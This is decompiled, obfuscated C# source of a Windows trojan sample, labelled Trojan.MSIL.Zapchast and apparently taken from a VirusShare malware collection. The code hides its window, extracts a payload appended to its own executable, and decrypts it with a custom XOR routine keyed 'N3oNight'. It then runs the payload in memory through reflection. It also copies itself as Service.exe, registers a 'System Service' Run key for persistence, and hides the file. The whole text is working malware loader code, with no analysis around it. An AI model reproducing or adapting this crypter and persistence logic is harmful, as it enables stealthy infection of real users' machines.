// Decompiled with JetBrains decompiler
// Type: .
// Assembly: TechService, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F89AA09C-6FCD-4FC3-9600-51AD51771A8A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.MSIL.Zapchast.f-66bde5cc3371d495bdad3f685cf6dbbd911b2a8af5a507d00a126e2a2d85428d.exe

using \u0002;
using \u0004;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace \u0002
{
  [DesignerGenerated]
  internal class \u0003 : Form
  {
    private IContainer \u0001;
    private byte[] \u0001;
    private byte[] \u0002;

    public \u0003()
    {
      this.Load += new EventHandler(this.\u0001);
      this.\u0002 = \u0001.Fun;
      this.\u0001();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.\u0001 == null)
          return;
        \u000F.\u007E\u000F((object) this.\u0001);
      }
      finally
      {
        \u0010.\u0013((object) this, disposing);
      }
    }

    [DebuggerStepThrough]
    private void \u0001()
    {
label_0:
      \u000F.\u007E\u0010((object) this);
      do
      {
        \u0011.\u007E\u0017((object) this, new SizeF(6f, 13f));
        \u0012.\u007E\u0018((object) this, AutoScaleMode.Font);
        do
        {
          \u0013.\u007E\u0019((object) this, new Size(10, 10));
          \u0014.\u007E\u001A((object) this, FormBorderStyle.None);
          if (true)
          {
            \u0015.\u007E\u001B((object) this, "Form1");
            \u0016.\u007E\u001C((object) this, 0.0);
            \u0010.\u007E\u0014((object) this, false);
            \u0010.\u007E\u0015((object) this, false);
          }
          else
            goto label_0;
        }
        while (false);
        if (false)
          goto label_2;
      }
      while (false);
      goto label_7;
label_2:
      return;
label_7:
      \u0010.\u007E\u0016((object) this, false);
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void \u0001(object sender, EventArgs e)
    {
      string[] strArray = \u0019.\u0080(\u0018.\u001F(\u0017.\u001D()), "CwXBSrQ1Vb", -1, CompareMethod.Binary);
      byte[] numArray1 = \u0003.\u0001(\u001B.\u007E\u0083((object) \u001A.\u0081(), strArray[1]), "N3oNight");
      if (true)
        goto label_13;
label_2:
      if (false)
        return;
      byte[] numArray2;
      object obj = \u0005.\u0005(\u0005.\u0005(\u001F.\u007E\u0088((object) \u001E.\u007E\u0087((object) \u001D.\u007E\u0086((object) \u001C.\u0084(this.\u0002), "Function1.Use"), "It"), (object) null, new object[1]
      {
        \u0005.\u0005(\u0005.\u0005(\u0005.\u0005(\u001F.\u007E\u0088((object) \u001E.\u007E\u0087((object) \u001D.\u007E\u0086((object) \u001C.\u0084(this.\u0002), "Function1.Use"), "This"), (object) null, new object[1]
        {
          (object) numArray2
        }))))
      })));
      int num1 = \u007F.\u0089(strArray[2]) ? 1 : 0;
      int num2;
      while (true)
      {
        if (num1 != 0)
        {
          if (!\u007F.\u008A(\u0080.\u008B(\u0017.\u001E(), "Service.exe")))
            \u0081.\u008C(\u0017.\u001D(), \u0080.\u008B(\u0017.\u001E(), "Service.exe"));
          RegistryKey registryKey = \u0082.\u007E\u008D((object) Registry.CurrentUser, "software\\microsoft\\windows\\currentversion\\run", true);
          \u0083.\u007E\u008E((object) registryKey, "System Service", (object) \u0080.\u008B(\u0017.\u001E(), "Service.exe"), RegistryValueKind.String);
        }
        string str = strArray[3];
        num2 = \u007F.\u0089(str) ? 1 : 0;
        if (false)
          num1 = num2;
        else
          break;
      }
      if (num2 != 0)
        \u0084.\u008F(\u0017.\u001D(), FileAttributes.Hidden);
      \u0086.\u0090();
      return;
label_13:
      numArray2 = numArray1;
      goto label_2;
    }

    private static byte[] \u0001(byte[] input, string key1)
    {
      byte[] numArray1 = \u001B.\u007E\u0083((object) \u001A.\u0081(), key1);
      byte[] numArray2 = \u0088.\u0092(\u0087.\u007E\u0091((object) \u001A.\u0081(), input));
      int num1 = numArray2.Length;
      int num2 = 2;
      byte[] numArray3;
      byte num3;
      int num4;
      int index;
      int num5;
      int num6;
      if (num2 != 0)
      {
        numArray3 = new byte[checked (num1 - num2 + 1)];
        if (true)
        {
          num3 = numArray2[checked (numArray2.Length - 1)];
          int num7 = 0;
          int num8 = checked (numArray3.Length - 1);
          if (true)
          {
            num4 = num8;
            index = num7;
            goto label_7;
          }
          else
          {
            num6 = num8;
            num5 = num7;
          }
        }
        else
          goto label_7;
      }
      else
        goto label_8;
label_6:
      index = checked (num5 + num6);
label_7:
      int num9 = index;
      num2 = num4;
      num1 = num9;
label_8:
      if (num1 <= num2)
      {
        numArray3[index] = checked ((byte) ((int) numArray2[index] ^ unchecked ((int) (byte) ((uint) numArray1[index % numArray1.Length] << (checked (index + (int) num3 + numArray1.Length) & 7)) % 256)));
        num5 = index;
        num6 = 1;
        goto label_6;
      }
      else
      {
        byte[] numArray4 = numArray3;
        do
          ;
        while (false);
        if (true)
          return numArray4;
        goto label_7;
      }
    }
  }
}
